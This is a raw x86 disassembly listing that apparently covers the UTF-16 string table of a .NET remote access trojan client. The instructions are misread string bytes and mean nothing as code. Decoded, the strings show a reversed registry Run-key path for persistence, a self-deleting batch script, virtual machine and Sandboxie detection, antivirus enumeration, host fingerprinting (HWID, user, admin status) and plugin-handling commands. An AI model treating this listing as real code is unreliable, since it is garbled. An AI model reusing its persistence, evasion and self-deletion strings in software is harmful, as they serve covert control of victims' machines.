  407497:	00 65 00             	add    %ah,0x0(%ebp)
  40749a:	78 00                	js     0x40749c
  40749c:	69 00 74 00 01 5d    	imul   $0x5d010074,(%eax),%eax
  4074a2:	5c                   	pop    %esp
  4074a3:	00 6e 00             	add    %ch,0x0(%esi)
  4074a6:	75 00                	jne    0x4074a8
  4074a8:	52                   	push   %edx
  4074a9:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  4074ad:	00 6f 00             	add    %ch,0x0(%edi)
  4074b0:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  4074b6:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  4074ba:	74 00                	je     0x4074bc
  4074bc:	6e                   	outsb  %ds:(%esi),(%dx)
  4074bd:	00 65 00             	add    %ah,0x0(%ebp)
  4074c0:	72 00                	jb     0x4074c2
  4074c2:	72 00                	jb     0x4074c4
  4074c4:	75 00                	jne    0x4074c6
  4074c6:	43                   	inc    %ebx
  4074c7:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  4074cb:	00 77 00             	add    %dh,0x0(%edi)
  4074ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4074cf:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  4074d3:	00 69 00             	add    %ch,0x0(%ecx)
  4074d6:	57                   	push   %edi
  4074d7:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  4074db:	00 66 00             	add    %ah,0x0(%esi)
  4074de:	6f                   	outsl  %ds:(%esi),(%dx)
  4074df:	00 73 00             	add    %dh,0x0(%ebx)
  4074e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4074e3:	00 72 00             	add    %dh,0x0(%edx)
  4074e6:	63 00                	arpl   %eax,(%eax)
  4074e8:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  4074ee:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4074f2:	61                   	popa
  4074f3:	00 77 00             	add    %dh,0x0(%edi)
  4074f6:	74 00                	je     0x4074f8
  4074f8:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  4074fc:	53                   	push   %ebx
  4074fd:	00 00                	add    %al,(%eax)
  4074ff:	03 22                	add    (%edx),%esp
  407501:	00 00                	add    %al,(%eax)
  407503:	09 2e                	or     %ebp,(%esi)
  407505:	00 62 00             	add    %ah,0x0(%edx)
  407508:	61                   	popa
  407509:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40750d:	13 40 00             	adc    0x0(%eax),%eax
  407510:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  407514:	68 00 6f 00 20       	push   $0x20006f00
  407519:	00 6f 00             	add    %ch,0x0(%edi)
  40751c:	66 00 66 00          	data16 add %ah,0x0(%esi)
  407520:	00 1f                	add    %bl,(%edi)
  407522:	74 00                	je     0x407524
  407524:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40752a:	6f                   	outsl  %ds:(%esi),(%dx)
  40752b:	00 75 00             	add    %dh,0x0(%ebp)
  40752e:	74 00                	je     0x407530
  407530:	20 00                	and    %al,(%eax)
  407532:	33 00                	xor    (%eax),%eax
  407534:	20 00                	and    %al,(%eax)
  407536:	3e 00 20             	add    %ah,%ds:(%eax)
  407539:	00 4e 00             	add    %cl,0x0(%esi)
  40753c:	55                   	push   %ebp
  40753d:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  407541:	15 53 00 54 00       	adc    $0x540053,%eax
  407546:	41                   	inc    %ecx
  407547:	00 52 00             	add    %dl,0x0(%edx)
  40754a:	54                   	push   %esp
  40754b:	00 20                	add    %ah,(%eax)
  40754d:	00 22                	add    %ah,(%edx)
  40754f:	00 22                	add    %ah,(%edx)
  407551:	00 20                	add    %ah,(%eax)
  407553:	00 22                	add    %ah,(%edx)
  407555:	00 00                	add    %al,(%eax)
  407557:	07                   	pop    %es
  407558:	43                   	inc    %ebx
  407559:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40755d:	00 00                	add    %al,(%eax)
  40755f:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  407563:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  407567:	00 22                	add    %ah,(%edx)
  407569:	00 00                	add    %al,(%eax)
  40756b:	0f 22 00             	mov    %eax,%cr0
  40756e:	20 00                	and    %al,(%eax)
  407570:	2f                   	das
  407571:	00 66 00             	add    %ah,0x0(%esi)
  407574:	20 00                	and    %al,(%eax)
  407576:	2f                   	das
  407577:	00 71 00             	add    %dh,0x0(%ecx)
  40757a:	00 23                	add    %ah,(%ebx)
  40757c:	49                   	dec    %ecx
  40757d:	00 6e 00             	add    %ch,0x0(%esi)
  407580:	73 00                	jae    0x407582
  407582:	74 00                	je     0x407584
  407584:	61                   	popa
  407585:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  407589:	00 20                	add    %ah,(%eax)
  40758b:	00 46 00             	add    %al,0x0(%esi)
  40758e:	61                   	popa
  40758f:	00 69 00             	add    %ch,0x0(%ecx)
  407592:	6c                   	insb   (%dx),%es:(%edi)
  407593:	00 65 00             	add    %ah,0x0(%ebp)
  407596:	64 00 20             	add    %ah,%fs:(%eax)
  407599:	00 3a                	add    %bh,(%edx)
  40759b:	00 20                	add    %ah,(%eax)
  40759d:	00 00                	add    %al,(%eax)
  40759f:	05 78 00 70 00       	add    $0x700078,%eax
  4075a4:	00 45 53             	add    %al,0x53(%ebp)
  4075a7:	00 65 00             	add    %ah,0x0(%ebp)
  4075aa:	6c                   	insb   (%dx),%es:(%edi)
  4075ab:	00 65 00             	add    %ah,0x0(%ebp)
  4075ae:	63 00                	arpl   %eax,(%eax)
  4075b0:	74 00                	je     0x4075b2
  4075b2:	20 00                	and    %al,(%eax)
  4075b4:	2a 00                	sub    (%eax),%al
  4075b6:	20 00                	and    %al,(%eax)
  4075b8:	66 00 72 00          	data16 add %dh,0x0(%edx)
  4075bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4075bd:	00 6d 00             	add    %ch,0x0(%ebp)
  4075c0:	20 00                	and    %al,(%eax)
  4075c2:	57                   	push   %edi
  4075c3:	00 69 00             	add    %ch,0x0(%ecx)
  4075c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4075c7:	00 33                	add    %dh,(%ebx)
  4075c9:	00 32                	add    %dh,(%edx)
  4075cb:	00 5f 00             	add    %bl,0x0(%edi)
  4075ce:	43                   	inc    %ebx
  4075cf:	00 6f 00             	add    %ch,0x0(%edi)
  4075d2:	6d                   	insl   (%dx),%es:(%edi)
  4075d3:	00 70 00             	add    %dh,0x0(%eax)
  4075d6:	75 00                	jne    0x4075d8
  4075d8:	74 00                	je     0x4075da
  4075da:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4075de:	53                   	push   %ebx
  4075df:	00 79 00             	add    %bh,0x0(%ecx)
  4075e2:	73 00                	jae    0x4075e4
  4075e4:	74 00                	je     0x4075e6
  4075e6:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  4075ea:	00 19                	add    %bl,(%ecx)
  4075ec:	4d                   	dec    %ebp
  4075ed:	00 61 00             	add    %ah,0x0(%ecx)
  4075f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4075f1:	00 75 00             	add    %dh,0x0(%ebp)
  4075f4:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  4075f8:	63 00                	arpl   %eax,(%eax)
  4075fa:	74 00                	je     0x4075fc
  4075fc:	75 00                	jne    0x4075fe
  4075fe:	72 00                	jb     0x407600
  407600:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407604:	00 2b                	add    %ch,(%ebx)
  407606:	6d                   	insl   (%dx),%es:(%edi)
  407607:	00 69 00             	add    %ch,0x0(%ecx)
  40760a:	63 00                	arpl   %eax,(%eax)
  40760c:	72 00                	jb     0x40760e
  40760e:	6f                   	outsl  %ds:(%esi),(%dx)
  40760f:	00 73 00             	add    %dh,0x0(%ebx)
  407612:	6f                   	outsl  %ds:(%esi),(%dx)
  407613:	00 66 00             	add    %ah,0x0(%esi)
  407616:	74 00                	je     0x407618
  407618:	20 00                	and    %al,(%eax)
  40761a:	63 00                	arpl   %eax,(%eax)
  40761c:	6f                   	outsl  %ds:(%esi),(%dx)
  40761d:	00 72 00             	add    %dh,0x0(%edx)
  407620:	70 00                	jo     0x407622
  407622:	6f                   	outsl  %ds:(%esi),(%dx)
  407623:	00 72 00             	add    %dh,0x0(%edx)
  407626:	61                   	popa
  407627:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40762b:	00 6f 00             	add    %ch,0x0(%edi)
  40762e:	6e                   	outsb  %ds:(%esi),(%dx)
  40762f:	00 00                	add    %al,(%eax)
  407631:	0b 4d 00             	or     0x0(%ebp),%ecx
  407634:	6f                   	outsl  %ds:(%esi),(%dx)
  407635:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  407639:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40763d:	0f 56 00             	orps   (%eax),%xmm0
  407640:	49                   	dec    %ecx
  407641:	00 52 00             	add    %dl,0x0(%edx)
  407644:	54                   	push   %esp
  407645:	00 55 00             	add    %dl,0x0(%ebp)
  407648:	41                   	inc    %ecx
  407649:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40764d:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  407652:	77 00                	ja     0x407654
  407654:	61                   	popa
  407655:	00 72 00             	add    %dh,0x0(%edx)
  407658:	65 00 00             	add    %al,%gs:(%eax)
  40765b:	15 56 00 69 00       	adc    $0x690056,%eax
  407660:	72 00                	jb     0x407662
  407662:	74 00                	je     0x407664
  407664:	75 00                	jne    0x407666
  407666:	61                   	popa
  407667:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40766b:	00 6f 00             	add    %ch,0x0(%edi)
  40766e:	78 00                	js     0x407670
  407670:	00 17                	add    %dl,(%edi)
  407672:	53                   	push   %ebx
  407673:	00 62 00             	add    %ah,0x0(%edx)
  407676:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40767c:	6c                   	insb   (%dx),%es:(%edi)
  40767d:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  407681:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  407685:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  407689:	11 45 00             	adc    %eax,0x0(%ebp)
  40768c:	72 00                	jb     0x40768e
  40768e:	72 00                	jb     0x407690
  407690:	20 00                	and    %al,(%eax)
  407692:	48                   	dec    %eax
  407693:	00 57 00             	add    %dl,0x0(%edi)
  407696:	49                   	dec    %ecx
  407697:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40769b:	05 78 00 32 00       	add    $0x320078,%eax
  4076a0:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  4076a6:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  4076ac:	74 00                	je     0x4076ae
  4076ae:	49                   	dec    %ecx
  4076af:	00 6e 00             	add    %ch,0x0(%esi)
  4076b2:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  4076b6:	00 09                	add    %cl,(%ecx)
  4076b8:	48                   	dec    %eax
  4076b9:	00 57 00             	add    %dl,0x0(%edi)
  4076bc:	49                   	dec    %ecx
  4076bd:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  4076c1:	09 55 00             	or     %edx,0x0(%ebp)
  4076c4:	73 00                	jae    0x4076c6
  4076c6:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4076ca:	00 05 4f 00 53 00    	add    %al,0x53004f
  4076d0:	00 13                	add    %dl,(%ebx)
  4076d2:	4d                   	dec    %ebp
  4076d3:	00 69 00             	add    %ch,0x0(%ecx)
  4076d6:	63 00                	arpl   %eax,(%eax)
  4076d8:	72 00                	jb     0x4076da
  4076da:	6f                   	outsl  %ds:(%esi),(%dx)
  4076db:	00 73 00             	add    %dh,0x0(%ebx)
  4076de:	6f                   	outsl  %ds:(%esi),(%dx)
  4076df:	00 66 00             	add    %ah,0x0(%esi)
  4076e2:	74 00                	je     0x4076e4
  4076e4:	00 03                	add    %al,(%ebx)
  4076e6:	20 00                	and    %al,(%eax)
  4076e8:	00 09                	add    %cl,(%ecx)
  4076ea:	54                   	push   %esp
  4076eb:	00 72 00             	add    %dh,0x0(%edx)
  4076ee:	75 00                	jne    0x4076f0
  4076f0:	65 00 00             	add    %al,%gs:(%eax)
  4076f3:	0b 36                	or     (%esi),%esi
  4076f5:	00 34 00             	add    %dh,(%eax,%eax,1)
  4076f8:	62 00                	bound  %eax,(%eax)
  4076fa:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  407700:	46                   	inc    %esi
  407701:	00 61 00             	add    %ah,0x0(%ecx)
  407704:	6c                   	insb   (%dx),%es:(%edi)
  407705:	00 73 00             	add    %dh,0x0(%ebx)
  407708:	65 00 00             	add    %al,%gs:(%eax)
  40770b:	0b 33                	or     (%ebx),%esi
  40770d:	00 32                	add    %dh,(%edx)
  40770f:	00 62 00             	add    %ah,0x0(%edx)
  407712:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  407718:	50                   	push   %eax
  407719:	00 61 00             	add    %ah,0x0(%ecx)
  40771c:	74 00                	je     0x40771e
  40771e:	68 00 00 0f 56       	push   $0x560f0000
  407723:	00 65 00             	add    %ah,0x0(%ebp)
  407726:	72 00                	jb     0x407728
  407728:	73 00                	jae    0x40772a
  40772a:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  407730:	00 0b                	add    %cl,(%ebx)
  407732:	41                   	inc    %ecx
  407733:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  407737:	00 69 00             	add    %ch,0x0(%ecx)
  40773a:	6e                   	outsb  %ds:(%esi),(%dx)
  40773b:	00 00                	add    %al,(%eax)
  40773d:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  407741:	00 75 00             	add    %dh,0x0(%ebp)
  407744:	65 00 00             	add    %al,%gs:(%eax)
  407747:	17                   	pop    %ss
  407748:	50                   	push   %eax
  407749:	00 65 00             	add    %ah,0x0(%ebp)
  40774c:	72 00                	jb     0x40774e
  40774e:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  407752:	72 00                	jb     0x407754
  407754:	6d                   	insl   (%dx),%es:(%edi)
  407755:	00 61 00             	add    %ah,0x0(%ecx)
  407758:	6e                   	outsb  %ds:(%esi),(%dx)
  407759:	00 63 00             	add    %ah,0x0(%ebx)
  40775c:	65 00 00             	add    %al,%gs:(%eax)
  40775f:	11 50 00             	adc    %edx,0x0(%eax)
  407762:	61                   	popa
  407763:	00 73 00             	add    %dh,0x0(%ebx)
  407766:	74 00                	je     0x407768
  407768:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40776c:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  407772:	41                   	inc    %ecx
  407773:	00 6e 00             	add    %ch,0x0(%esi)
  407776:	74 00                	je     0x407778
  407778:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40777e:	72 00                	jb     0x407780
  407780:	75 00                	jne    0x407782
  407782:	73 00                	jae    0x407784
  407784:	00 13                	add    %dl,(%ebx)
  407786:	49                   	dec    %ecx
  407787:	00 6e 00             	add    %ch,0x0(%esi)
  40778a:	73 00                	jae    0x40778c
  40778c:	74 00                	je     0x40778e
  40778e:	61                   	popa
  40778f:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  407793:	00 65 00             	add    %ah,0x0(%ebp)
  407796:	64 00 00             	add    %al,%fs:(%eax)
  407799:	09 50 00             	or     %edx,0x0(%eax)
  40779c:	6f                   	outsl  %ds:(%esi),(%dx)
  40779d:	00 6e 00             	add    %ch,0x0(%esi)
  4077a0:	67 00 00             	add    %al,(%bx,%si)
  4077a3:	0b 47 00             	or     0x0(%edi),%eax
  4077a6:	72 00                	jb     0x4077a8
  4077a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4077a9:	00 75 00             	add    %dh,0x0(%ebp)
  4077ac:	70 00                	jo     0x4077ae
  4077ae:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  4077b4:	00 2b                	add    %ch,(%ebx)
  4077b6:	5c                   	pop    %esp
  4077b7:	00 72 00             	add    %dh,0x0(%edx)
  4077ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4077bb:	00 6f 00             	add    %ch,0x0(%edi)
  4077be:	74 00                	je     0x4077c0
  4077c0:	5c                   	pop    %esp
  4077c1:	00 53 00             	add    %dl,0x0(%ebx)
  4077c4:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4077c8:	75 00                	jne    0x4077ca
  4077ca:	72 00                	jb     0x4077cc
  4077cc:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  4077d2:	43                   	inc    %ebx
  4077d3:	00 65 00             	add    %ah,0x0(%ebp)
  4077d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4077d7:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  4077db:	00 72 00             	add    %dh,0x0(%edx)
  4077de:	32 00                	xor    (%eax),%al
  4077e0:	00 3d 53 00 65 00    	add    %bh,0x650053
  4077e6:	6c                   	insb   (%dx),%es:(%edi)
  4077e7:	00 65 00             	add    %ah,0x0(%ebp)
  4077ea:	63 00                	arpl   %eax,(%eax)
  4077ec:	74 00                	je     0x4077ee
  4077ee:	20 00                	and    %al,(%eax)
  4077f0:	2a 00                	sub    (%eax),%al
  4077f2:	20 00                	and    %al,(%eax)
  4077f4:	66 00 72 00          	data16 add %dh,0x0(%edx)
  4077f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4077f9:	00 6d 00             	add    %ch,0x0(%ebp)
  4077fc:	20 00                	and    %al,(%eax)
  4077fe:	41                   	inc    %ecx
  4077ff:	00 6e 00             	add    %ch,0x0(%esi)
  407802:	74 00                	je     0x407804
  407804:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40780a:	72 00                	jb     0x40780c
  40780c:	75 00                	jne    0x40780e
  40780e:	73 00                	jae    0x407810
  407810:	50                   	push   %eax
  407811:	00 72 00             	add    %dh,0x0(%edx)
  407814:	6f                   	outsl  %ds:(%esi),(%dx)
  407815:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  407819:	00 63 00             	add    %ah,0x0(%ebx)
  40781c:	74 00                	je     0x40781e
  40781e:	00 17                	add    %dl,(%edi)
  407820:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  407824:	73 00                	jae    0x407826
  407826:	70 00                	jo     0x407828
  407828:	6c                   	insb   (%dx),%es:(%edi)
  407829:	00 61 00             	add    %ah,0x0(%ecx)
  40782c:	79 00                	jns    0x40782e
  40782e:	4e                   	dec    %esi
  40782f:	00 61 00             	add    %ah,0x0(%ecx)
  407832:	6d                   	insl   (%dx),%es:(%edi)
  407833:	00 65 00             	add    %ah,0x0(%ebp)
  407836:	00 07                	add    %al,(%edi)
  407838:	4e                   	dec    %esi
  407839:	00 2f                	add    %ch,(%edi)
  40783b:	00 41 00             	add    %al,0x0(%ecx)
  40783e:	00 05 2c 00 20 00    	add    %al,0x20002c
  407844:	00 13                	add    %dl,(%ebx)
  407846:	53                   	push   %ebx
  407847:	00 6f 00             	add    %ch,0x0(%edi)
  40784a:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40784f:	00 61 00             	add    %ah,0x0(%ecx)
  407852:	72 00                	jb     0x407854
  407854:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  407859:	09 70 00             	or     %esi,0x0(%eax)
  40785c:	6f                   	outsl  %ds:(%esi),(%dx)
  40785d:	00 6e 00             	add    %ch,0x0(%esi)
  407860:	67 00 00             	add    %al,(%bx,%si)
  407863:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  407868:	75 00                	jne    0x40786a
  40786a:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40786e:	6e                   	outsb  %ds:(%esi),(%dx)
  40786f:	00 00                	add    %al,(%eax)
  407871:	15 73 00 61 00       	adc    $0x610073,%eax
  407876:	76 00                	jbe    0x407878
  407878:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40787c:	6c                   	insb   (%dx),%es:(%edi)
  40787d:	00 75 00             	add    %dh,0x0(%ebp)
  407880:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  407884:	6e                   	outsb  %ds:(%esi),(%dx)
  407885:	00 00                	add    %al,(%eax)
  407887:	07                   	pop    %es
  407888:	44                   	inc    %esp
  407889:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40788d:	00 00                	add    %al,(%eax)
  40788f:	15 73 00 65 00       	adc    $0x650073,%eax
  407894:	6e                   	outsb  %ds:(%esi),(%dx)
  407895:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  407899:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40789d:	00 67 00             	add    %ah,0x0(%edi)
  4078a0:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  4078a6:	48                   	dec    %eax
  4078a7:	00 61 00             	add    %ah,0x0(%ecx)
  4078aa:	73 00                	jae    0x4078ac
  4078ac:	68 00 65 00 73       	push   $0x73006500
  4078b1:	00 00                	add    %al,(%eax)
  4078b3:	09 48 00             	or     %ecx,0x0(%eax)
  4078b6:	61                   	popa
  4078b7:	00 73 00             	add    %dh,0x0(%ebx)
  4078ba:	68 00 00 19 70       	push   $0x70190000
  4078bf:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  4078c3:	00 67 00             	add    %ah,0x0(%edi)
  4078c6:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  4078cc:	73 00                	jae    0x4078ce
  4078ce:	61                   	popa
  4078cf:	00 76 00             	add    %dh,0x0(%esi)
  4078d2:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  4078d7:	1b 50 00             	sbb    0x0(%eax),%edx
  4078da:	6c                   	insb   (%dx),%es:(%edi)
  4078db:	00 75 00             	add    %dh,0x0(%ebp)
  4078de:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  4078e2:	6e                   	outsb  %ds:(%esi),(%dx)
  4078e3:	00 2e                	add    %ch,(%esi)
  4078e5:	00 50 00             	add    %dl,0x0(%eax)
  4078e8:	6c                   	insb   (%dx),%es:(%edi)
  4078e9:	00 75 00             	add    %dh,0x0(%ebp)
  4078ec:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  4078f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4078f1:	00 00                	add    %al,(%eax)
  4078f3:	07                   	pop    %es
  4078f4:	52                   	push   %edx
  4078f5:	00 75 00             	add    %dh,0x0(%ebp)
  4078f8:	6e                   	outsb  %ds:(%esi),(%dx)
  4078f9:	00 00                	add    %al,(%eax)
  4078fb:	0f 4d 00             	cmovge (%eax),%eax
  4078fe:	73 00                	jae    0x407900
  407900:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  407904:	61                   	popa
  407905:	00 63 00             	add    %ah,0x0(%ebx)
  407908:	6b 00 00             	imul   $0x0,(%eax),%eax
  40790b:	11 52 00             	adc    %edx,0x0(%edx)
  40790e:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  407912:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  407916:	76 00                	jbe    0x407918
  407918:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40791d:	0b 45 00             	or     0x0(%ebp),%eax
  407920:	72 00                	jb     0x407922
  407922:	72 00                	jb     0x407924
  407924:	6f                   	outsl  %ds:(%esi),(%dx)
  407925:	00 72 00             	add    %dh,0x0(%edx)
  407928:	00 47 6d             	add    %al,0x6d(%edi)
  40792b:	00 61 00             	add    %ah,0x0(%ecx)
  40792e:	73 00                	jae    0x407930
  407930:	74 00                	je     0x407932
  407932:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  407936:	4b                   	dec    %ebx
  407937:	00 65 00             	add    %ah,0x0(%ebp)
  40793a:	79 00                	jns    0x40793c
  40793c:	20 00                	and    %al,(%eax)
  40793e:	63 00                	arpl   %eax,(%eax)
  407940:	61                   	popa
  407941:	00 6e 00             	add    %ch,0x0(%esi)
  407944:	20 00                	and    %al,(%eax)
  407946:	6e                   	outsb  %ds:(%esi),(%dx)
  407947:	00 6f 00             	add    %ch,0x0(%edi)
  40794a:	74 00                	je     0x40794c
  40794c:	20 00                	and    %al,(%eax)
  40794e:	62 00                	bound  %eax,(%eax)
  407950:	65 00 20             	add    %ah,%gs:(%eax)
  407953:	00 6e 00             	add    %ch,0x0(%esi)
  407956:	75 00                	jne    0x407958
  407958:	6c                   	insb   (%dx),%es:(%edi)
  407959:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40795d:	00 6f 00             	add    %ch,0x0(%edi)
  407960:	72 00                	jb     0x407962
  407962:	20 00                	and    %al,(%eax)
  407964:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  407968:	70 00                	jo     0x40796a
  40796a:	74 00                	je     0x40796c
  40796c:	79 00                	jns    0x40796e
  40796e:	2e 00 00             	add    %al,%cs:(%eax)
  407971:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  407976:	70 00                	jo     0x407978
  407978:	75 00                	jne    0x40797a
  40797a:	74 00                	je     0x40797c
  40797c:	20 00                	and    %al,(%eax)
  40797e:	63 00                	arpl   %eax,(%eax)
  407980:	61                   	popa
  407981:	00 6e 00             	add    %ch,0x0(%esi)
  407984:	20 00                	and    %al,(%eax)
  407986:	6e                   	outsb  %ds:(%esi),(%dx)
  407987:	00 6f 00             	add    %ch,0x0(%edi)
  40798a:	74 00                	je     0x40798c
  40798c:	20 00                	and    %al,(%eax)
  40798e:	62 00                	bound  %eax,(%eax)
  407990:	65 00 20             	add    %ah,%gs:(%eax)
  407993:	00 6e 00             	add    %ch,0x0(%esi)
  407996:	75 00                	jne    0x407998
  407998:	6c                   	insb   (%dx),%es:(%edi)
  407999:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40799d:	00 00                	add    %al,(%eax)
  40799f:	55                   	push   %ebp
  4079a0:	49                   	dec    %ecx
  4079a1:	00 6e 00             	add    %ch,0x0(%esi)
  4079a4:	76 00                	jbe    0x4079a6
  4079a6:	61                   	popa
  4079a7:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  4079ab:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  4079af:	00 6d 00             	add    %ch,0x0(%ebp)
  4079b2:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4079b6:	73 00                	jae    0x4079b8
  4079b8:	61                   	popa
  4079b9:	00 67 00             	add    %ah,0x0(%edi)
  4079bc:	65 00 20             	add    %ah,%gs:(%eax)
  4079bf:	00 61 00             	add    %ah,0x0(%ecx)
  4079c2:	75 00                	jne    0x4079c4
  4079c4:	74 00                	je     0x4079c6
  4079c6:	68 00 65 00 6e       	push   $0x6e006500
  4079cb:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4079cf:	00 63 00             	add    %ah,0x0(%ebx)
  4079d2:	61                   	popa
  4079d3:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4079d7:	00 6f 00             	add    %ch,0x0(%edi)
  4079da:	6e                   	outsb  %ds:(%esi),(%dx)
  4079db:	00 20                	add    %ah,(%eax)
  4079dd:	00 63 00             	add    %ah,0x0(%ebx)
  4079e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4079e1:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  4079e5:	00 20                	add    %ah,(%eax)
  4079e7:	00 28                	add    %ch,(%eax)
  4079e9:	00 4d 00             	add    %cl,0x0(%ebp)
  4079ec:	41                   	inc    %ecx
  4079ed:	00 43 00             	add    %al,0x0(%ebx)
  4079f0:	29 00                	sub    %eax,(%eax)
  4079f2:	2e 00 00             	add    %al,%cs:(%eax)
  4079f5:	05 58 00 32 00       	add    $0x320058,%eax
  4079fa:	00 00                	add    %al,(%eax)
  4079fc:	ce                   	into
  4079fd:	96                   	xchg   %eax,%esi
  4079fe:	18 ba b1 43 59 47    	sbb    %bh,0x475943b1(%edx)
  407a04:	8a 88 42 9b 76 3a    	mov    0x3a769b42(%eax),%cl
  407a0a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407a0b:	70 00                	jo     0x407a0d
  407a0d:	04 20                	add    $0x20,%al
  407a0f:	01 01                	add    %eax,(%ecx)
  407a11:	08 03                	or     %al,(%ebx)
  407a13:	20 00                	and    %al,(%eax)
  407a15:	01 05 20 01 01 11    	add    %eax,0x11010120
  407a1b:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  407a1e:	01 01                	add    %eax,(%ecx)
  407a20:	0e                   	push   %cs
  407a21:	04 20                	add    $0x20,%al
  407a23:	01 01                	add    %eax,(%ecx)
  407a25:	02 05 20 01 01 11    	add    0x11010120,%al
  407a2b:	51                   	push   %ecx
  407a2c:	0b 07                	or     (%edi),%eax
  407a2e:	09 08                	or     %ecx,(%eax)
  407a30:	02 02                	add    (%edx),%al
  407a32:	02 02                	add    (%edx),%al
  407a34:	02 02                	add    (%edx),%al
  407a36:	02 02                	add    (%edx),%al
  407a38:	04 00                	add    $0x0,%al
  407a3a:	01 01                	add    %eax,(%ecx)
  407a3c:	08 04 00             	or     %al,(%eax,%eax,1)
  407a3f:	01 08                	add    %ecx,(%eax)
  407a41:	0e                   	push   %cs
  407a42:	04 00                	add    $0x0,%al
  407a44:	01 02                	add    %eax,(%edx)
  407a46:	0e                   	push   %cs
  407a47:	03 07                	add    (%edi),%eax
